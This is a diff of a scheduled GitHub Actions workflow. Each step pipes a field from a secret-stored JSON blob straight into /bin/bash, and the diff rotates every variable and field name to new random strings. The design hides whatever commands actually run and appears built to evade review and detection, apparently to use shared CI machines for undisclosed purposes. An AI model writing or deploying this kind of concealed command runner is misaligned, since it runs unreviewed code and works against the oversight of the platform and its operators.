@@ -3,25 +3,24 @@ name: yanfeihong5672
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 1/6 * * *'
+    - cron: '3 1/6 * * *'
 
-jobs:  # 30360
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yanfeihong5672
         env:
-          v9: ${{ secrets.v9 }}
+          uxye96153: ${{ secrets.uxye96153 }}
         run: |
-          echo $v9 | jq -r .njjg459 | /bin/bash
-          echo $mswwm6074 | jq -r .jw75 | /bin/bash
-          echo $znah96604 | jq -r .kqpm6983 | /bin/bash
-          echo $dmsbq898 | jq -r .lxy59996 | /bin/bash
-          echo $sdpiq066 | jq -r .obqb949 | /bin/bash
-          echo $fhk25913 | jq -r .epndj8 | /bin/bash
-          echo $wohqu76 | jq -r .tvpr3408 | /bin/bash
-          echo $wh38 | jq -r .cqzeh1069 | /bin/bash
-          echo $zdree22 | jq -r .u71542 | /bin/bash
-          echo $j500 | jq -r .gfcqp37 | /bin/bash
+          echo $uxye96153 | jq -r .phu97049 | /bin/bash
+          echo $lo4 | jq -r .unfre75691 | /bin/bash
+          echo $yjkt54 | jq -r .ppuny0329 | /bin/bash
+          echo $s86 | jq -r .nc97142 | /bin/bash
+          echo $r1 | jq -r .qci55681 | /bin/bash
+          echo $xu13955 | jq -r .bfkr32 | /bin/bash
+          echo $pb03749 | jq -r .v921 | /bin/bash
+          echo $raj16 | jq -r .g51 | /bin/bash
+          echo $zoye12 | jq -r .t22292 | /bin/bash
 
